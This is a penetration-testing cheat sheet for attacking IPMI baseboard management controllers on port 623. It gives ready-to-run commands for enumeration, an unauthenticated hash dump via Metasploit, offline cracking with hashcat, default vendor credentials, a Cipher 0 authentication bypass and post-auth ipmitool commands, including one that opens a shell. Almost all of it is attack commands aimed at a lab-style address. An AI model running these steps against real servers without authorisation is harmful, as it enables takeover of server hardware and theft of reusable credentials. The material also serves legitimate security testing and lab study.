# IPMI (623)

!!! tip "Start here"
    Dump IPMI hashes unauthenticated using Metasploit — this works against IPMI 2.0 without credentials. Crack offline with hashcat mode 7300. Default creds are also worth trying immediately: `admin:admin`, `ADMIN:ADMIN`, `root:calvin`.

---

## Enumeration

```bash
nmap -sU -p 623 --script ipmi-version 10.10.10.10
```

---

## Hash Dump (Unauthenticated)

```bash
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 10.10.10.10
run
```

```bash
hashcat -m 7300 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Default Credentials

```bash
ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin chassis status
```

---

## Cipher 0 Auth Bypass

IPMI 2.0 sometimes accepts authentication with Cipher 0, which allows any password.

```bash
ipmitool -I lanplus -C 0 -H 10.10.10.10 -U ADMIN -P anything user list
```

---

## Post-Auth Commands

```bash
ipmitool -I lanplus -H 10.10.10.10 -U <user> -P <pass> user list
ipmitool -I lanplus -H 10.10.10.10 -U <user> -P <pass> sensor
ipmitool -I lanplus -H 10.10.10.10 -U <user> -P <pass> sel list
ipmitool -I lanplus -H 10.10.10.10 -U <user> -P <pass> shell
```

!!! tip "Real-world"
    IPMI is common on bare-metal server hardware (Dell iDRAC, HP iLO, Supermicro BMC). The `root:calvin` default is specific to Dell iDRAC and still works on plenty of unpatched systems. Hash dumps are particularly valuable here — even a cracked IPMI hash often reuses credentials on the host OS or other management interfaces.
